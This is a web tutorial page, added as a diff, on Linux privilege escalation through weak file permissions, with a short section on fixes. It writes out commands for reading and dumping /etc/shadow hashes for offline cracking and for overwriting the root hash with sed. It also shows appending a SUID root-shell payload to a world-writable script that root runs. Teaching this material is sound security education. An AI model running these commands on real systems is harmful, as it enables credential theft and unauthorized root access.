@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Weak File Permissions - Rare Code Base</title>
+
+    <meta name="description"
+        content="Learn how weak file permissions in Linux can be exploited for privilege escalation. Explore real-world examples like writable scripts and misconfigured /etc/shadow, with practical exploitation and mitigation techniques.">
+
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+    <script src="/js/main.js" defer></script>
+    <script src="/js/sidebar.js" defer></script>
+</head>
+
+<body>
+
+    <div id="navbar-placeholder"></div>
+
+    <main class="d-lg-flex flex-nowrap d-block">
+        <div id="sidebar-placeholder"></div>
+
+        <div class="content p-4">
+            <h1 class="mt-4">Exploiting Weak File Permissions</h1>
+
+            <p>
+                Weak file permissions in Linux can allow a low-privileged user to read or modify files they shouldn't
+                have access to. This can lead to privilege escalation, credential dumping, or even full root access.
+            </p>
+
+            <p>
+                Check sensitive files like <code>/etc/shadow</code> for weak permissions:
+            </p>
+            <pre><code>$ ls -l /etc/shadow</code></pre>
+
+            <p><strong>Vulnerable output:</strong></p>
+            <pre><code>-rw-r--r-- 1 root root 1484 Apr 12 10:00 /etc/shadow</code></pre>
+
+            <p>
+                If <code>/etc/shadow</code> is readable by others, it means someone could extract password hashes and
+                potentially crack them offline.
+            </p>
+
+            <h4 class="mt-4">Dumping Hashes</h4>
+            <p>To dump the password hashes, run:</p>
+            <pre><code>$ cat /etc/shadow
+root:$6$3kERjdM$7k...:19327:0:99999:7:::
+user1:$6$yzb...:19327:0:99999:7:::</code></pre>
+
+            <p>
+                Now you can crack the hashes using tools like <code>john</code> or <code>hashcat</code> to obtain the
+                actual
+                passwords.
+            </p>
+
+            <h4 class="mt-4">Writable /etc/shadow?</h4>
+            <p>If you somehow have write access to <code>/etc/shadow</code>, you can modify the file:</p>
+            <pre><code>$ sed -i 's/^root:[^:]*:/root:$6$YOURNEWSHASH$SOMETHING:/' /etc/shadow</code></pre>
+
+            <p>
+                This command replaces the root password hash with one of your own choosing, allowing you to log in as
+                root.
+            </p>
+
+            <h3 class="mt-5">Writable Script File Executed by Root</h3>
+
+            <p>
+                Let’s say we find a script file with weak permissions:
+            </p>
+            <pre><code>-rwxrwxrwx 1 root root 88 Apr 10 10:00 /usr/local/bin/backup.sh</code></pre>
+
+            <p>
+                If this script is scheduled to run via cron or is triggered by a root-owned service, and you can modify
+                it, you can inject malicious commands into the script.
+            </p>
+
+            <h4 class="mt-4">Inject Payload</h4>
+            <p>Add a root shell creation payload:</p>
+            <pre><code>$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /usr/local/bin/backup.sh</code></pre>
+
+            <p>Once the script runs as root, you can execute the payload:</p>
+            <pre><code>$ /tmp/rootbash -p
+# whoami
+root</code></pre>
+
+            <h4 class="mt-4">Why This Works</h4>
+            <p>
+                If a file that is executed by root is writable by any user, they can inject commands into the file. When
+                this file is run as root, those commands execute with root privileges, giving full control to the
+                attacker.
+            </p>
+
+            <h3 class="mt-5">How to Fix Weak File Permissions</h3>
+            <ul>
+                <li>Set the correct permissions on sensitive files, for example: <code>chmod 640 /etc/shadow</code>.
+                </li>
+                <li>Ensure that only root can write to scripts that are executed by root.</li>
+                <li>Regularly audit your file permissions using commands like <code>find</code> to identify any files
+                    with weak permissions.</li>
+            </ul>
+
+            <h3 class="mt-5">Conclusion</h3>
+            <p>
+                Weak file permissions are often overlooked, but they can be devastating. Always check critical files
+                like <code>/etc/shadow</code>, and monitor writable files and scripts that root may run. Exploiting just
+                one misconfigured file can lead to full system compromise.
+            </p>
+        </div>
+
+    </main>
+
+    <div id="footer-placeholder"></div>
+</body>
+
+</html>
